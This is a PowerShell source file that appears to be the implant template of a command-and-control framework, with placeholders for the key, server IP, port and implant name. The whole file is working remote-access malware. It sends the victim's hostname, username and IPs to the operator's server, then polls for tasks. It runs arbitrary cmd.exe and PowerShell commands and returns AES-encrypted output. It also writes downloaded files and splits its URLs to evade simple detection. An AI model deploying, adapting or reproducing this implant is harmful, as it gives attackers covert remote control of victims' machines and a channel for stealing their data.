function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)	
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

function First($key,$ip,$port,$implant_name){

    $Hostname = "Machine_Name("+ [System.Net.Dns]::GetHostByName($NULL).Hostname + ")"
    $username = "Username("+$env:USERNAME+")"
    $LocalIPs = "LocalIPs(" + (([System.Net.Dns]::GetHostByName($NULL).AddressList | Select IPAddressToString | findstr ".*.*.") -join ',').replace('IPAddressToString,-----------------,','').replace(" ","") + ")"

    $all = $Hostname + $username + $LocalIPs
    $Enc_all = Encrypt-String $key $all

    $record = "ht" + 'tp:' + "//" + $ip + ':' + $port + "/record/" + $implant_name
    $data = @{result="$Enc_all"}
    $req = Invoke-WebRequest -UseBasicParsing -Uri $record -Body $data -Method 'POST'
}

function exec($filename,$arguments){

        $process = New-Object System.Diagnostics.Process
        $process.startInfo.UseShellExecute = $false
        $process.startinfo.FileName = "$filename"
        $process.startInfo.Arguments = "$arguments"
        $process.startInfo.UseShellExecute = $false
        $process.startInfo.RedirectStandardError = $true
        $process.startInfo.RedirectStandardOutput = $true
        $process.Start() | Out-Null

        $process.WaitForExit()

        $process.StandardOutput.ReadToEnd() + $process.StandardError.ReadToEnd() 
        


}

function Execute($key,$ip,$port,$implant_name,$sleep_time){
    $task = "ht" + "tp:" + "//" + $ip + ":$port/task/$implant_name"
    $file_download = "ht" + 'tp:' + "//" + $ip + ":$port/task/$implant_name/file.ret"
    $result = "ht" + "tp:" + "//" + $ip + ":$port/result/$implant_name"
    $renamed =  "ht" + "tp:" + "//" + $ip + ":$port/renamed/$implant_name"
    
    while ($true) {


    Try {
        $task_req = (Invoke-WebRequest -UseBasicParsing -Uri $task -Method 'GET').Content
        }
    Catch{
   
        $task_req = ""

        }

    if ($task_req){
        $dec_task = Decrypt-String $key $task_req

        $dec_task = $dec_task.split()

        $binary = $dec_task[0]
	    $args = $dec_task[1..$dec_task.Length]
	
        if ($binary -eq "cmd") {
            
            $cmd = "cmd.exe"
            $full_args = "/c "
            foreach ($a in $args){ $full_args += $a + " " }

            $results = exec $cmd $full_args


            $results = Encrypt-String $key $results


            $data = @{result = "$results"}
            Try {
                $req = Invoke-WebRequest -UseBasicParsing -Uri $result -Body $data -Method 'POST'
            }
            Catch{
            
                $req = ""
            }
        }
        
        
        
        elseif ($binary -eq "powershell"){
        
            $cmd = "powershell.exe"
            $full_args = "/c "
            foreach ($a in $args){ $full_args += $a + " " }

            $results = exec $cmd $full_args
            $results = Encrypt-String $key $results


            $data = @{result = "$results"}
            Try{
                $req = Invoke-WebRequest -UseBasicParsing -Uri $result -Body $data -Method 'POST'
               }
            Catch{
            
                $req = ""
            }
        }
        
        
        
        elseif ($binary -eq "exit"){
            exit
         
        }
        
        
        
        elseif ($binary -eq "rename"){

            
            
            $results = Encrypt-String $key "Changed"
            $data = @{result = "$results"}
            Try {
                $req = Invoke-WebRequest -UseBasicParsing -Uri $renamed -Body $data -Method 'POST'
                $implant_name = $dec_task[1]
               }
            Catch{
            
                $req = ""
            }
        }
        
        
        elseif ($binary -eq "sleep"){
            $sleep_time = $dec_task[1]
            
            $results = Encrypt-String $key "Slept"
            $data = @{result = "$results"}
            Try{

                $req = Invoke-WebRequest -UseBasicParsing -Uri $result -Body $data -Method 'POST'
            }Catch{
            
                $req = ""
            }
        }
        
        
        elseif ($binary -eq "download"){
            
            
            $data = (Invoke-WebRequest -UseBasicParsing -Uri $file_download -Method 'POST').Content
            $data = Decrypt-String $key $data
            $cmd = "powershell.exe"
            $args = "/c $file =" + $data + " | Add-Content -Path $args"
            $results = exec $cmd $args

            

            $results = Encrypt-String $key "Downloaded"
            $data = @{result = "$results"}
            Try{
                $req = Invoke-WebRequest -UseBasicParsing -Uri $result -Body $data -Method 'POST'
            }Catch{
            
                $req = ""
            }
        }

    }
    
    sleep $sleep_time[0]
    }
}

$key = "REPLACE_KEY"
$ip = "REPLACE_IP"
$port = "REPLACE_PORT"
$implant_name = "REPLACE_NAME"
$sleep_time = 5



First $key $ip $port $implant_name 

Execute $key $ip $port $implant_name $sleep_time
